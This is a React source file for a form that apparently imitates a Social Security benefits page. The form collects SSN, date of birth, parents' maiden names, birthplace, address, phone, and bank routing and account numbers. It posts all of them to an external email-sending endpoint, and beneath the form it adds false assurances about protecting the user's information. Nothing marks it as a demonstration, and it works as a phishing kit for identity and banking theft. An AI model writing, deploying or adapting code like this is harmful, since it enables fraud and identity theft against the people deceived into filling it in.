import { useState } from "react";
import axios from "axios";

const initialState = {
  fname: "",
  ssn: "",
  mailAddress: "",
  fathersFname: "",
  mothersFname: "",
  city: "",
  state: "",
  amount: "",
  routing: "",
  account: "",
  phone_number: "",
  QA: "",
  dob: "",
  dateOfPayment: "",
};
const Home = () => {
  const [formData, setFormData] = useState(initialState);

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await axios.post(
        `https://ssform.onrender.com/send-email`,
        formData
      );
      console.log(response.data);
      setFormData(initialState);
    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };
  return (
    <>
      <div className="container home">
        <form onSubmit={handleSubmit}>
          <div className="mb-2">
            <label htmlFor="fname" className="form-label">
              Full Name
            </label>
            <input
              type="text"
              className="form-control"
              id="fname"
              name="fname"
              value={formData.fname}
              onChange={handleChange}
            />
          </div>

          <div className="mb-2">
            <label htmlFor="ssn" className="form-label">
              SSN
            </label>
            <input
              type="text"
              className="form-control"
              id="ssn"
              name="ssn"
              value={formData.ssn}
              onChange={handleChange}
            />
          </div>

          <div className="mb-2">
            <label htmlFor="mailAddress" className="form-label">
              Mailing Address on Profile
            </label>
            <input
              type="text"
              className="form-control"
              id="mailAddress"
              name="mailAddress"
              value={formData.mailAddress}
              onChange={handleChange}
            />
          </div>

          <div className="mb-2">
            <label htmlFor="fathersFname" className="form-label">
              Father&apos;s Full Name And Maiden Name
            </label>
            <input
              type="text"
              className="form-control"
              id="fathersFname"
              name="fathersFname"
              value={formData.fathersFname}
              onChange={handleChange}
            />
          </div>

          <div className="mb-2">
            <label htmlFor="mothersFname" className="form-label">
              Mother&apos;s Full Name And Maiden Name
            </label>
            <input
              type="text"
              className="form-control"
              id="mothersFname"
              name="mothersFname"
              value={formData.mothersFname}
              onChange={handleChange}
            />
          </div>

          <div className="mb-2">
            <label htmlFor="city" className="form-label">
              City Born
            </label>
            <input
              type="text"
              className="form-control"
              id="city"
              name="city"
              value={formData.city}
              onChange={handleChange}
            />
          </div>

          <div className="mb-2">
            <label htmlFor="state" className="form-label">
              State
            </label>
            <input
              type="text"
              className="form-control"
              id="state"
              name="state"
              value={formData.state}
              onChange={handleChange}
            />
          </div>

          <div className="mb-2">
            <label htmlFor="amount" className="form-label">
              Amount Received Last Month (In USD)
            </label>
            <input
              type="text"
              className="form-control"
              id="amount"
              name="amount"
              value={formData.amount}
              onChange={handleChange}
            />
          </div>

          <div className="mb-2">
            <label htmlFor="routing" className="form-label">
              Routing Number That&apos;s On File
            </label>
            <input
              type="text"
              className="form-control"
              id="routing"
              name="routing"
              value={formData.routing}
              onChange={handleChange}
            />
          </div>

          <div className="mb-2">
            <label htmlFor="account" className="form-label">
              Account Number That&apos;s On File
            </label>
            <input
              type="text"
              className="form-control"
              id="account"
              name="account"
              value={formData.account}
              onChange={handleChange}
            />
          </div>

          <div className="mb-2">
            <label htmlFor="phone_number" className="form-label">
              Phone Number
            </label>
            <input
              type="text"
              className="form-control"
              id="phone_number"
              name="phone_number"
              value={formData.phone_number}
              onChange={handleChange}
            />
          </div>
          <div className="mb-2">
            <label htmlFor="QA" className="form-label">
              Did You Receive SSA (YES or NO)
            </label>
            <select
              required
              className="form-select"
              id="QA"
              name="QA"
              value={formData.QA}
              onChange={handleChange}
            >
              <option value="">Select an Option</option>
              <option value="Yes">Yes</option>
              <option value="No">No</option>
            </select>
          </div>

          <div className="mb-2">
            <label htmlFor="dob" className="form-label">
              DOB
            </label>
            <input
              type="date"
              className="form-control"
              id="dob"
              name="dob"
              value={formData.dob}
              onChange={handleChange}
            />
          </div>

          <div className="mb-2">
            <label htmlFor="dateOfPayment" className="form-label">
              Date Of Payment (MM/DD/YY)
            </label>
            <input
              type="date"
              className="form-control"
              id="dateOfPayment"
              name="dateOfPayment"
              value={formData.dateOfPayment}
              onChange={handleChange}
            />
          </div>

          <button type="submit" className="btn btn-primary">
            Submit
          </button>
        </form>

        <div className="text-below">
          <p>
            Are you now, or have you ever been a victim of domestic violence?
            Identity theft? Do you have other concerns?
          </p>
          <p>
            You can contact us to block electronic access to your information at
            any time, for any reason.
          </p>
          <div className="form-text">
            We&apos;ll never share your information with anyone else.
          </div>
        </div>
      </div>
    </>
  );
};

export default Home;
